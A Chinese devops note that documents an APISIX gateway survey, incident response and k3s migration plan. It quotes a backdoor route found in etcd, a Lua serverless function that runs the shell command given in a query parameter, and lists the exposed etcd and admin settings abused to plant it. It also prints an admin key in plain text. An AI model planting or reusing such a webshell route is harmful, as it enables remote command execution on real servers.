---
{"dg-publish":true,"permalink":"/knowledge/devops/practices/05-APISIX迁移k3s方案/","title":"APISIX 迁移 k3s 方案","tags":["devops","apisix","k3s","迁移"],"dg-note-properties":{"title":"APISIX 迁移 k3s 方案","date":"2026-09-20","tags":["devops","apisix","k3s","迁移"]}}
---


# APISIX 迁移 k3s 方案

> 本文含真实公网 IP / 域名 / 凭证 / 拓扑 → **不发布、不挂首页**。
> 记录 2026-09-20 杭州 APISIX 现状勘察、安全事件处置与迁移规划。

---

## 一、现状（迁移前基线）

### 1.1 部署形态

杭州 server（`203.0.113.11`）上，APISIX 以 **docker-compose**（`/root/services/apisix/`）部署：

| 容器 | 镜像 | 端口映射 | 状态（处置前） |
| :--- | :--- | :--- | :--- |
| apisix | apache/apisix:3.0.0-debian | 80→9080, 9180, 9443, 9091, 9092 | ❌ CrashLoop 10 个月 |
| etcd | bitnami/etcd:3.4.15 | 12379→2379 | ✅ Up |
| apisix-dashboard | apache/apisix-dashboard:2.13-alpine | 9000 | ✅ Up |
| cloudreve | cloudreve/cloudreve | 5212 | ✅ Up |

**关键事实**：APISIX 网关**实际已宕机约 10 个月**（容器 `nginx: [emerg] bind() to unix:config_listen.sock failed`），但 etcd 里的路由配置完整。

### 1.2 配置要点

`apisix_conf/config.yaml`：
- 监听：网关 9080 / admin 9180 / prometheus 9091 / control 9092
- etcd 地址：`http://etcd:2379`（compose 网络服务别名）
- etcd 前缀：`/apisix`
- ⚠️ 原始 `admin_key` = 默认公开值 `edd1c9f0...`，`allow_admin = 0.0.0.0/0`（全网放开）

### 1.3 路由清单（10 条）

| # | 路由名 | 域名 | upstream | 备注 |
| :-: | :--- | :--- | :--- | :--- |
| 1 | cloudreve | cloudreve / www / 裸域 example.com | `cloudreve:5212` | 容器内网寻址 |
| 2 | apisix | apisix.example.com | `apisix-dashboard:9000` | 自身面板 |
| 3 | nas | nas.example.com | `172.17.0.1:5000` | NAS |
| 4 | static | static.example.com | `172.17.0.1:8011` | 静态资源 |
| 5 | remote-desktop | rd.example.com | `172.17.0.1:3389` | RDP |
| 6 | asus-ssh | asus.example.com | `172.17.0.1:5222` | SSH |
| 7 | jump-server | jump.example.com | `172.17.0.1:5080` | WebSocket |
| 8 | halo | halo.example.com | `203.0.113.11:8090` | 博客 WebSocket |
| 9 | jenkins-tencent | jenkins.example.com | `203.0.113.12:8080` | 腾讯 Jenkins WebSocket |
| 10 | home-node | home-node.example.com | `172.17.0.1:33389` | 家宽节点 |

**上游分三类**：
- 容器内网寻址（`cloudreve`、`apisix-dashboard`）→ 依赖 docker 网络别名
- 宿主机直连（`172.17.0.1` × 6）→ docker0 网关 = 宿主机
- 外部 IP（`203.0.113.11` halo、`203.0.113.12` Jenkins）

---

## 二、安全事件：后门路由（2026-09-20 发现）

### 2.1 事件

勘察路由时发现一条**恶意后门路由** `zz4aa103`：

```json
{"name":"zz4aa103","id":"zz4aa103",
 "create_time":1789173924,"update_time":1789173924,
 "plugins":{"serverless-pre-function":{"phase":"rewrite",
   "functions":["return function() local h=io.popen(ngx.var.arg_c); local o=h:read('*a'); h:close(); ngx.say(o); ngx.exit(200) end"]}},
 "uri":"/zz4aa103","methods":["GET"]}
```

**危害**：通过 `?c=<命令>` 执行**任意 shell 命令**（`io.popen`），完整 **RCE 后门**。
植入时间 ≈ 2026-09-13（时间戳 1789173924）。

### 2.2 植入通道推测

| 嫌疑通道 | 依据 | 处置 |
| :--- | :--- | :--- |
| **etcd 无鉴权 + 12379 公网暴露** | `ALLOW_NONE_AUTHENTICATION=yes`，`0.0.0.0:12379` 监听 | ✅ 取消端口映射 |
| admin API 默认 key + allow_admin 0.0.0.0/0 | 默认公开 key，9180 可公网访问 | ✅ 换 key + 收紧白名单 |

### 2.3 处置动作（已完成）

| # | 动作 | 结果 |
| :-: | :--- | :--- |
| 1 | 备份后门证据 | `backdoor-zz4aa103.txt` |
| 2 | 备份完整 etcd 快照 | `etcd-full-dump.txt` |
| 3 | 删除后门路由 | `etcdctl del /apisix/routes/zz4aa103` ✅ |
| 4 | 更换 admin/viewer key | 随机生成，存档 `new-admin-key.txt` |
| 5 | 收紧 `allow_admin` | strict 白名单（127.0.0.1 + 203.0.113.11 + 192.168.32.0/20 + 10.88.0.0/24） |
| 6 | 取消 etcd 12379 宿主机映射 | ✅ 仅容器内可达 |

**证据/备份存档目录**（杭州 `203.0.113.11`）：
```
/root/security-incident-20260920/
  ├── backdoor-zz4aa103.txt
  ├── etcd-full-dump.txt
  └── new-admin-key.txt          # 600 权限
/root/services/apisix/apisix_conf/config.yaml.bak-*
/root/services/apisix/docker-compose.yml.bak-*
```

### 2.4 ⚠️ 仍未完成

- **9000（dashboard）仍公网暴露** —— 待收
- **云安全组规则未核**（12379 / 9000 / 9080）—— 需控制台确认
- **其他 etcd key 未细查**（consumers / global_rules / plugin_metadata 只扫了 key 名）
- **网关端口暴露面偏大**：80/9180/9443/9091/9092 都监听 0.0.0.0

---

## 三、CrashLoop 修复过程

### 3.1 现象演变

| 阶段 | 报错 | 原因 |
| :--- | :--- | :--- |
| 最初 | `bind() to unix:config_listen.sock failed (Address already in use)` | socket 残留 / 旧 nginx 进程 |
| 重建 etcd 后 | `temporary failure in name resolution`（etcd 解析失败） | 手动 `docker run` 无网络别名 `etcd` |
| 最终修复 | — | compose v2 重建，别名恢复 |

### 3.2 修复动作

1. 安装 **docker compose v2**（原 v1.29.2 有 `KeyError: 'ContainerConfig'` bug，会删容器不建新的）

   ```bash
   curl -sSL -o /usr/local/lib/docker/cli-plugins/docker-compose \
     "https://ghfast.top/https://github.com/docker/compose/releases/download/v2.40.3/docker-compose-linux-x86_64"
   chmod +x /usr/local/lib/docker/cli-plugins/docker-compose
   ```

2. 用 v2 重建：

   ```bash
   cd /root/services/apisix
   docker compose up -d etcd apisix
   ```

3. 验证：`getent hosts etcd` → `192.168.32.4 etcd`（别名生效）、路由 11 条 key 完好

### 3.3 血泪教训

- ⚠️ **这台机器上 `docker-compose`（v1.29.2）不可靠** —— 改容器一律用 `docker compose`（v2）
- ⚠️ **etcd 数据在 named volume `apisix_etcd_data`**，**不是** bind mount `./etcd_data/`（compose 里 `volumes: etcd_data:` 是 named volume）—— 手动重建时挂错卷会一片空白
- ⚠️ **`admin_key` 更新后必须重启容器**（config.yaml 是 bind mount 文件，`docker compose up` 不重建，得 `docker restart`）
- ⚠️ APISIX 白名单外 IP 返回的是 **401 而非 403**，容易误判为"key 错"

---

## 四、迁移方案（k3s）

### 4.1 方案选型

| 方案 | 数据迁移 | 评价 |
| :--- | :--- | :--- |
| **A. APISIX Ingress Controller** | ❌ 配置源变 CRD，老 etcd 数据要手工转 | 云原生正统但迁移麻烦 |
| **B. APISIX + etcd 原样搬** | ✅ etcd 快照直接恢复，路由零改动 | ✅ **选定**（贴合 kubectl apply 流派） |
| C. standalone 模式 | ❌ 动态配置丢失 | ✗ |

**选 B**：`etcdctl snapshot` 导出 → k3s 内 etcd 恢复 → 路由原封不动。

### 4.2 目标架构

| 原容器 | k3s 对象 | 说明 |
| :--- | :--- | :--- |
| etcd | StatefulSet `apisix-etcd` | 1 副本，PVC 挂 `/etcd-data`，从快照恢复 |
| apisix | Deployment `apisix` | config.yaml 走 ConfigMap |
| dashboard | Deployment `apisix-dashboard` | 可选 |
| cloudreve | ⏸️ **留宿主机** | 数据小（44M，SQLite），解耦，不迁 |

### 4.3 ⚠️ 迁移必改项（关键）

**`172.17.0.1` 在 k8s 里不通！** 6 条路由的 upstream 要改：

| 路由 | 原 upstream | 改法 |
| :--- | :--- | :--- |
| nas | `172.17.0.1:5000` | → 宿主机真实 IP:5000 |
| static | `172.17.0.1:8011` | → 宿主机真实 IP:8011 |
| remote-desktop | `172.17.0.1:3389` | → 宿主机真实 IP:3389 |
| asus-ssh | `172.17.0.1:5222` | → 宿主机真实 IP:5222 |
| jump-server | `172.17.0.1:5080` | → 宿主机真实 IP:5080 |
| home-node | `172.17.0.1:33389` | → 宿主机真实 IP:33389 |
| cloudreve | `cloudreve:5212` | → 宿主机真实 IP:5212 |
| apisix | `apisix-dashboard:9000` | → k8s 内 ClusterIP |

**方案**：宿主机侧用 **ExternalName Service** 或直接写宿主机 IP；网关暴露用 **NodePort**。

### 4.4 执行步骤（分步，每步验证）

1. ✅ 勘察（已完成）
2. ⬜ 备份：etcd snapshot + `/root/services/apisix/` 目录打包
3. ⬜ 建 ConfigMap（config.yaml，etcd 地址改 k3s 内网 DNS）
4. ⬜ 建 etcd StatefulSet + PVC + Service
5. ⬜ 恢复 etcd 数据（snapshot restore）
6. ⬜ 建 APISIX Deployment + Service
7. ⬜ 验证：admin API 列 10 条路由 + 网关能代理
8. ⬜ （可选）迁移 dashboard
9. ⬜ 公网入口切换（**单独确认**，风险最高）

### 4.5 网络规划

| 端口 | 用途 | k3s 暴露方式 |
| :--- | :--- | :--- |
| 9080 | 网关 | NodePort 30080（或 hostNetwork 保留 80） |
| 9180 | admin | ClusterIP（仅集群内） |
| 9091 | prometheus | 保持 ClusterIP，接入现有 Prometheus |
| 9092 | control | ClusterIP |

**优势**：迁到 k3s 后，admin 端口不再暴露公网（可观测性栈顺便采集 APISIX 指标）。

---

## 五、待办清单

| 优先级 | 事项 | 备注 |
| :-: | :--- | :--- |
| P0 | 收掉 9000（dashboard）公网暴露 | 安全 |
| P0 | 阿里云安全组核查 12379/9000/9080 | 需控制台 |
| P1 | 排查 etcd 其他 key 内容（consumers/global_rules/plugin_metadata） | 后门排查 |
| P1 | etcd snapshot 备份 + 目录打包 | 迁移前置 |
| P2 | 迁移实施（步骤 3-9） | 重头戏 |
| P3 | 文件描述符限制调优（1024 → 更大） | APISIX 性能警告 |

---

## 六、Halo 域名路由切换（2026-09-22）

> 背景：Halo 迁到 k3s 后（見 `04-k3s部署实战.md` §Halo 部署实战），APISIX 里 `halo.example.com` 的 upstream 还指向**旧宿主机 docker 部署**（`203.0.113.11:8090`），需改指向 k3s 新后端。

### 6.1 操作

- admin API：`http://127.0.0.1:9180/apisix/admin/routes/<id>`
- **⚠️ admin key 以容器 `config.yaml` 里的为准**（`4531ed446b172e8d42906aa185ab1dd0`）；`security-incident-20260920/new-admin-key.txt` 里那个实测校验失败，别用
- halo 路由：`id=559975175957775038`，host `halo.example.com`，uris `/*`

```bash
# PATCH 改 upstream
curl -X PATCH -H "X-API-KEY: <key>" -H "Content-Type: application/json" \
  "http://127.0.0.1:9180/apisix/admin/routes/559975175957775038" \
  -d '{"upstream":{"type":"roundrobin","scheme":"http","nodes":[{"host":"203.0.113.11","port":30090,"weight":1}]}}'
# → HTTP 201
```

**改动：`upstream.host:port` 由 `203.0.113.11:8090` → `203.0.113.11:30090`**（8090 = 旧宿主机 docker；30090 = k3s NodePort，自动转发到 Lenovo 上的 Pod）。

### 6.2 为什么选 NodePort 而不是直指 Pod/ClusterIP

- Pod IP 会变，不适合写死
- ClusterIP 走不通（**APISIX 在宿主机 docker，不在 k3s 集群内网**）
- NodePort 在杭州节点已监听（k3s NodePort 全节点生效）→ 改动最小、最稳
- 注：原路由已带 `enable_websocket: true`（Halo 后台需要），保留

### 6.3 验证

```
curl -H "Host: halo.example.com" http://203.0.113.11/actuator/health/readiness
# → {"status":"UP"}  HTTP 200
# DNS: halo.example.com → 203.0.113.11
```

### 6.4 流量路径（改后）

```
用户 → halo.example.com
         ↓ DNS
      203.0.113.11 (杭州)
         ↓ APISIX :30090
      k3s NodePort → Lenovo 上的 Halo Pod
```

### 6.5 HTTPS（暂不做，已评估）

**现状**：APISIX 只映射 `80:9080`，**443 未映射**；`9443:9443` 映射了但 APISIX 无 ssl 监听配置；**ssl 对象 0 个**；无任何证书文件 → 纯 HTTP。

**方案（待用户决定）**：

| 方案 | 说明 |
|---|---|
| 阿里云免费单域名证书 | 一年期，20 张/年，下载 Nginx 格式（.pem+.key）| 
| 通配符 `*.example.com` | **一张证书覆盖所有三级域名**（halo/apisix/nas/jenkins…）；付费或 Let's Encrypt DNS-01 免费 |
| APISIX ACME 插件 | 自动申请+续期（需配验证通道）|

**关键认知（用户问过）**：**不同三级域名能否共用一张证书** → 通配符 `*.example.com` 可以（同一层级所有三级域名），单域名证书不行；APISIX 按 **SNI** 自动匹配证书，通配符只需一个 ssl 对象管全部。

**操作步骤（选了就做）**：
1. 申请证书（阿里云 / LE）
2. `config.yaml` 开 ssl 监听：`apisix.ssl.listen: [{port: 9443, enable_http2: true}]`
3. `docker-compose.yml` 加 `- "443:9443/tcp"`
4. 上传证书：`PUT /apisix/admin/ssls/1 {cert, key, snis: ["*.example.com", "example.com"]}`
5. 阿里云安全组放行 443

### 6.6 其他域名（未动）

APISIX 共 10 条路由，本次**只动 halo 一条**；其余 apisix/nas/static/jenkins/home-node/asus/jump/rd/cloudreve 保持原样。

---

## 相关文档

- `04-k3s部署实战.md` — k3s 三节点集群基础
- `03-Jenkins迁移k3s方案.md` — 同类迁移参考
